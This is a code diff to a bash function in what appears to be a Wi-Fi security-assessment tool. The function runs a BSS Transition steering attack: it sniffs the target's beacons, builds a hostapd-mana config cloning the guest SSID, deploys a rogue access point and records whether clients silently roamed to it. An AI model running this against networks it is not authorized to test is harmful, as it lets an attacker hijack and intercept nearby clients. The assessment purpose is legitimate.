@@ -22,8 +22,27 @@
 
 run_g5() {
     set -uo pipefail
+    
+    local mon_iface="${MONITOR_INTERFACE:-}"
+    local ap_iface="${WIFI_INTERFACE:-wlan0}"
+    local target_ssid="${GUEST_SSID:-}"
+    local target_bssid="${GUEST_BSSID:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --monitor-interface) mon_iface="$2"; shift 2 ;;
+            --managed-interface) ap_iface="$2"; shift 2 ;;
+            --target-ssid) target_ssid="$2"; shift 2 ;;
+            --target-bssid) target_bssid="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
     local total_steps=5
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/g5"
+    local evidence_prefix="${evidence_dir}/g5"
     
     log_step 1 $total_steps "Detecting 802.11v/k Support"
     update_tc_progress 1 $total_steps "Detection"
@@ -32,17 +51,20 @@ run_g5() {
 
     check_abort || return 1
 
-    if [[ -z "${GUEST_SSID:-}" ]]; then
+    if [[ -z "$target_ssid" ]]; then
         log_error "Target SSID not set. Run A1 first."; return 1
     fi
 
     # Verify if the AP advertises 802.11v (BSS Transition)
-    enable_monitor_mode || return 1
-    local mon_iface="${MONITOR_INTERFACE}"
-    local beacon_file="$TMP_DIR/g5_check.pcap"
+    if [[ -z "$mon_iface" ]]; then
+        enable_monitor_mode || return 1
+        mon_iface="${MONITOR_INTERFACE}"
+    fi
+    
+    local beacon_file="${TMP_DIR:-/tmp}/g5_check.pcap"
     
     log_info "Analyzing beacons for 802.11v/k capabilities..."
-    ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -c 20 -w "$beacon_file" "type mgt subtype beacon and ether src ${GUEST_BSSID}" &>/dev/null || true
+    run_fg --quiet tcpdump -i "$mon_iface" -c 20 -w "$beacon_file" "type mgt subtype beacon and ether src ${target_bssid}" || true
     
     local dot11v_supported="false"
     if [[ -f "$beacon_file" ]]; then
@@ -61,18 +83,17 @@ run_g5() {
     check_abort || return 1
 
     # This attack requires hostapd-mana for BTM frame injection
-    if [[ ! -x "${TOOL_PATHS[hostapd-mana]}" ]] && ! command -v hostapd-mana &>/dev/null; then
+    if [[ ! -x "${TOOL_PATHS[hostapd-mana]:-}" ]] && ! command -v hostapd-mana &>/dev/null; then
         log_error "hostapd-mana is required for BSS Transition attacks."
         return 1
     fi
 
-    local mana_conf="${SESSION_EVIDENCE_DIR}/g5_mana.conf"
-    local ap_iface="${WIFI_INTERFACE:-wlan0}"
+    local mana_conf="${evidence_dir}/g5_mana.conf"
     
     cat <<EOF > "$mana_conf"
 interface=${ap_iface}
 driver=nl80211
-ssid=${GUEST_SSID}
+ssid=${target_ssid}
 hw_mode=g
 channel=1
 # Enable MANA steering and BTM
@@ -88,17 +109,16 @@ EOF
 
     log_info "Deploying Rogue AP and sending BTM steering frames..."
     # Start hostapd-mana with steering enabled
-    hostapd-mana "$mana_conf" > "${evidence_prefix}_mana.log" 2>&1 &
-    local mana_pid=$!
-    register_cleanup "kill -TERM $mana_pid 2>/dev/null || true; wait $mana_pid 2>/dev/null || true"
+    spawn_bg "g5_mana" "hostapd-mana" --log "${evidence_prefix}_mana.log" "$mana_conf"
 
     start_countdown 60 "Monitoring for silent client roaming"
     sleep 60
     stop_countdown
+    stop_process "g5_mana"
 
     log_step 4 $total_steps "Verifying Roam Status"
     local roam_detected="false"
-    if grep -qi "associated" "${evidence_prefix}_mana.log"; then
+    if grep -qi "associated" "${evidence_prefix}_mana.log" 2>/dev/null; then
         roam_detected="true"
         log_result "CRITICAL" "BSS Transition Roam SUCCESSFUL: Client silently moved to Rogue AP!"
     fi
@@ -107,7 +127,7 @@ EOF
     local result_status="SECURE"
     [[ "$roam_detected" == "true" ]] && result_status="VULNERABLE"
     
-    local result_json=$(run_tool jq -n \
+    local result_json=$(run_fg jq -n \
         --arg status "$result_status" \
         --arg summary "BSS Transition Attack: ${result_status}" \
         --arg details "802.11v detected: ${dot11v_supported}, Client Roamed: ${roam_detected}" \
